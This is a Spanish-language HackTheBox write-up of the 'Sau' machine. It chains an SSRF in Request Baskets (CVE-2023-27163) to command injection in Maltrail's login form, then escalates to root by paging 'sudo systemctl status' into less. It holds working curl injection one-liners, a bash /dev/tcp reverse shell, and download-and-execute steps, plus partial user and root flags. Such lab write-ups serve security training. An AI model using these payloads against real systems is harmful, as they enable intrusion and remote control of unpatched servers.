---
title: "Sau - HTB Writeup"
layout: single
excerpt: "Sau es una máquina fácil de HackTheBox. En ella nos aprovechamos de un SSRF para explotar un RCE en un servicio interno para conseguir acceso inicial. Para conseguir el root abusamos de un privilegio de sudoers para spawnear una shell aprovechandonos del paginado automático de systemctl"
show_date: true
classes: wide
toc: true
toc_label: "Content"
toc_icon: "fire"
toc_sticky: false
header:
  teaser: https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/c947310f-7b8b-4fad-b142-880fb5e6a1f4
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/67548295/191989683-8e498bfd-d8dd-4e45-b929-f557100f9648.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - SSRF
  - RCE
  - systemctl
  - Linux
---

![Sau](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/98a90b87-23a1-4c0d-a699-003da07dad73)

# Recon
Como siempre comenzamos con el escaneo de **nmap**:
```bash
❯ sudo nmap -p- --open -sS --min-rate 4000 -n -sC -sV -oN TCPscan 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.073s latency).
Not shown: 65531 closed tcp ports (reset), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
55555/tcp open  unknown

[...]

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.82 seconds
```

Parámetro | Explícación |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', para agilizar el escaneo ya que este valida el estado de un puerto solo con el primer paso del handshake TCP. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido |
| `-sC` | Utiliza un escaneo con una serie de scripts de enumeración por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados del escaneo en formato normal, tal cual se ve en el escaneo. |

Vemos abiertos el puerto **tcp/22** y **tcp/55555**

# User.txt
## Port 55555
Ya que el puerto **22** suele estar abierto en todas las máquinas como medio para obtener una shell más estable después de la explotación, me fijo en el puerto **55555**

Visito este puerto desde el navegador y vemos lo siguiente:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/a7384c05-1cbf-4a45-a97d-862a7d34389d)

*Request Baskets*, no sé lo que es así que lo busco en google
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/86fadf2e-1880-4074-970f-10d46928747b)

Al parecer es un proyecto de código abierto alojado en **GitHub** para inspeccionar peticiones, tipo [RequestBin](https://pipedream.com/requestbin).
Tambíen, con solo buscar el nombre del software, nos aparece que la versión 1.2.1 es vulnerable a **SSRF**

Si tenemos buena vista notamos que la versión aparece en la parte baja del dashboard:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/0936bf34-c742-4f0a-8cf9-45c296458aae)

Sabemos que tenemos una **versión vulnerable**, pero primero veamos un poco del **funcionamiento básico** de la aplicación.

### Testing Request Baskets
Al principio tenemos el panel principal que nos deja crear un recurso personal para inspeccionar las peticiones.
Podemos ponerle el nombre que queramos, yo le pondré `z3r0`
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/a8db7805-1dcd-44be-bd0c-4a173e0f213b)

Le damos a `create` y aparece lo siguiente:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/b576dbd0-c754-47fc-b473-a56ac4374a33)

Clickamos en `Open Basket` y ya tendremos creada nuestra instancia personal.
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/ba31f39f-779a-4991-9b32-d14ceb1b0880)

Podemos ver como funciona haciendo una peticion POST con `curl` por ejemplo:
```bash
❯ curl -X POST http://10.10.11.224:55555/z3r0 -d "data=cualquiercosa"
```
Ahora podemos inspeccionar esa petición en nuestra instancia personal:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/a804ce37-c9ae-4ddb-b274-c42f4956433e)

Así funciona, no tiene más.
Ahora inspeccionemos de que se trata la vulnerabilidad que vimos antes.

###  Reviewing CVE-2023-27163
Esta vulnerabilidad consiste en un **SSRF** que permite a un atacante acceder a recursos de red internos, todo mediante una petición modificada a la API .
> [Request Baskets v1.2.1 SSRF](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

Aquí es donde me estanqué haciendo la máquina, porque no sabía a que recurso interno apuntar.
Resulta que yo siempre utilizo el parámetro `--open` con `nmap`, pero si hacemos un escaneo sin este parámetro, *voila*:
```bash
❯ sudo nmap -p- -sS --min-rate 5000 -n 10.10.11.224
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-07 18:15 WET
Nmap scan report for 10.10.11.224
Host is up (0.10s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
```
Vemos que tenemos puertos filtrados, que significa que `nmap` no pudo averiguar si el puerto estaba cerrado o abierto debido a un firewall o regla de filtado.
Podemos ver la diferencia entre un puerto filtrado y uno cerrado con la herramienta `nc`
##### Closed port
```bash
❯ nc -vv 10.10.11.224 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
NCAT DEBUG: Using system default trusted CA certificates and those in /etc/ssl/certs/ca-certificates.crt.
libnsock nsock_iod_new2(): nsock_iod_new (IOD #1)
libnsock nsock_connect_tcp(): TCP connection requested to 10.10.11.224:1337 (IOD #1) EID 8
libnsock nsock_trace_handler_callback(): Callback: CONNECT ERROR [Connection refused (111)] for EID 8 [10.10.11.224:1337]
Ncat: Connection refused.
```
Recibimos un `connection refused`
##### Filtered port
```bash
❯ nc -vv 10.10.11.224 8338
Ncat: Version 7.93 ( https://nmap.org/ncat )
NCAT DEBUG: Using system default trusted CA certificates and those in /etc/ssl/certs/ca-certificates.crt.
libnsock nsock_iod_new2(): nsock_iod_new (IOD #1)
libnsock nsock_connect_tcp(): TCP connection requested to 10.10.11.224:8338 (IOD #1) EID 8
libnsock nsock_trace_handler_callback(): Callback: CONNECT TIMEOUT for EID 8 [10.10.11.224:8338]
Ncat: TIMEOUT.
```
Recibimos un `connection timeout`.

### Exploting CVE-2023-27163
Suponiendo que esos dos puertos filtrados son servicios internos de la máquina, procedo con la explotación del **SSRF**.

> [PoC of SSRF on Request-Baskets (CVE-2023-27163)](https://github.com/entr0pie/CVE-2023-27163)

Según este PoC podemos obtener un **SSRF** enviando una petición especial a la **API** de este software para crear un 'basket' que redirija al recurso interno que queramos.
Desmembrando el exploit todo se reduce a este comando:
```bash
curl -s -X POST 10.10.11.224:55555/api/baskets/z3r0byte -H "Content-Type: application/json" -d '{"forward_url":"http://127.0.0.1:8338","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":250}'
```
Nótese que en el campo `forward_url` puse el recurso interno a donde quería acceder, en este caso al puerto filtrado `8338`.
Si hacemos la petición y accedemos al basket (`z3r0byte` en este caso) desde el navegador, deberíamos ver el recurso interno:

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/9a53ee9b-921f-461b-82cf-e92cbca8f336)

Y vemos que el servicio interno que está alojado en el puerto 8338, solo accesible desde localhost (y por nosotros ahora :b), se trata de `Maltrail`

### Exploiting Maltrail through SSRF
Podemos ver la versión del `Maltrail` alojado, _v0.53_.

Si buscamos vulnerabilidades para esta versión en google nos da una alegría:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/bb7ee0c5-0195-4d63-a099-6f2fc4a9312a)

Al parecer esta versión es vulnerable a un RCE, eso significa que pa dentro que nos vamos.

La exploitación es tan simple que no hace falta ni utilizar exploits ya hechos, el **RCE** existe el parámetro `username` del panel de login.
Lo podemos explotar con este simple one-liner
```bash
curl 10.10.11.224:55555/z3r0byte/login -d 'username=$(id|nc LHOST LPORT)'
```
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/0b2b43a3-98ca-418b-a393-d9703a649b3f)

Visto esto ya podemos acceder a la máquina con una reverse shell (dado que mi sistema tambien ejecuta el comando que pongo, tengo que hacerlo de esta manera):

1. Creamos un index.html con el contenido de la reverse shell:
```bash
❯ echo "bash -i >& /dev/tcp/10.10.16.5/4444 0>&1" > index.html
```
2. Creamos un servidor HTTP rápido con `python3`:
```bash
❯ authbind python3 -m http.server 80
```
3. Con el RCE hacemos que la máquina víctima descargue el index malicioso:
```bash
curl 10.10.11.224:55555/z3r0byte/login -d 'username=;$(curl 10.10.16.5 -o /tmp/shell.sh)'
```
* Vamos a recibir dos peticiones, la de nuestra máquina y la de la máquina víctima
4. Borramos el archivo que se descargó en nuestra máquina
```bash
❯ ls -la /tmp/shell.sh
.rw-r--r-- z3r0byte z3r0byte 41 B Sun Jan  7 19:33:38 2024  /tmp/shell.sh❯ rm /tmp/shell.sh
❯ rm /tmp/shell.sh
```
5. Nos ponemos en escucha con netcat
```bash
❯ nc -lvnp 4444
```
6. Hacemos que se ejecute el archivo malicioso en la máquina víctima
```bash
❯ curl 10.10.11.224:55555/z3r0byte/login -d 'username=;$(bash /tmp/shell.sh)'
```
7. Disfrutar de la shell 😎
```bash
puma@sau:/opt/maltrail$ echo "de puta madre 😎"
de puta madre 😎
```

A partir de aquí podemos ver la flag `user.txt` en `/home/puma`:
```bash
puma@sau:~$ head --bytes 16 user.txt ;echo
7d709839f637a483
```

# Root.txt
Si hacemos `sudo -l` veremos lo siguiente:
```bash
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
Podemos ejecutar como cualquier usuario, sin contraseña, el comando que vemos ahí.

Con el propio `systemctl` no podremos hacer nada, pero si hacemos la ventana de la terminal pequeña (o lo simulamos) veremos algo:
```bash
puma@sau:~$ stty rows 10 columns 80 #simulamos tener pantalla de gameboy por lo menos
```

![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/96df4e55-1e01-4aa4-9c38-4b3054003720)

La máquina piensa que nuestra pantalla es pequeña y para ver todo el ouput del comando se activa el comando paginador `less`

Y según sé yo, con `less` podemos spawnear una shell:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/0d27fda4-a49b-4e93-83e0-d0c5cba5c8a6)
> Fuente: [GTFOBins](https://gtfobins.github.io/gtfobins/less/)

Pues ya está, solo escribimos `!/bin/bash` y pa dentro:
![image](https://github.com/z3rObyte/z3rObyte.github.io/assets/67548295/075e6b82-e5d2-4f3f-864d-8ac0252dad9e)

Ya podemos ver la flag `root.txt` e irnos a celebrarlo:
```bash
root@sau:/home/puma# head --bytes 16 /root/root.txt ; echo
601d7dc10ae3232a
```
